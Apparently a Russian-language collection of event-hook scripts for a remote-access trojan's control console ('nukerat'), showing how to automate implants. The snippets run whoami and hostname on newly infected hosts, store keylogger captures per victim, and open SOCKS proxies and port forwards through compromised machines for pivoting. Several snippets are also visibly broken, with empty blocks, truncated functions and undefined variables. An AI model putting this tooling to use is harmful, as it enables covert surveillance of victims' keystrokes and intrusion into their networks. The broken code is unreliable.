## Синхронные и асинхронные команды на новом импланте

```python
def format_host(host):
    user = host.get("user", "?")
    name = host.get("hostname", host["tag"])
    return f"[+] new implant: {user} @ {name}"

def on_connect(host):
    echo(format_host(host))
    cmd(host["tag"], "whoami")
    async_cmd(host["tag"], "hostname")

event.new_host:on_connect()
```

## Уведомление об удалении хоста

```python
import json
import os

def on_removed(host):
    path = f"/tmp/nukerat/removed/{host['tag']}.json"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(host, f, default=str)
    message_box("Host removed", host["tag"], type="info")

event.removed_host:on_removed()
```

```python
def filter_task(task):
```

## Сохранение строк кейлоггера и подсчёт записей

```python
import os

def on_keys(entry):
    path = f"/tmp/nukerat/keys/{entry['host_tag']}/{entry['tag']}.txt"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:

    echo(f"keylogs in db: {len(keylogs())}")

event.keylogger_update:on_keys()
```

## Дописывание вывода терминала в дневной лог

```python
import os
from datetime import date

def log_output(line):
    path = f"/tmp/nukerat/logs/{date.today()}.log"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "a") as f:
```

## Открытие SOCKS и port forward при новом listener

```python
def on_listener(row):
    if row["type"] != "http":
        return
    hosts = db.hosts()
    if not hosts:
        return
    tag = hosts[0]["tag"]
    network.add_socks(tag, 1080)
    network.add_forward(tag, 8080, '127.0.0.1', 80)

event.listeners_update:on_listener()
```

## Перезапуск и удаление сетевой сессии по таймеру

```python
def manage_net(_):
    for row in db.listeners():
        if row["type"] not in ("socks", "port_forwarding"):
            continue
        echo(network.restart(row["tag"]))
        echo(network.remove(row["tag"]))
        return

event.heartbeat_60m:manage_net()
```

## Выборка строк очереди из базы

```python
def dump_queue(_):

        json.dump(rows[:10], f, default=str)

event.heartbeat_5m:dump_queue()
```
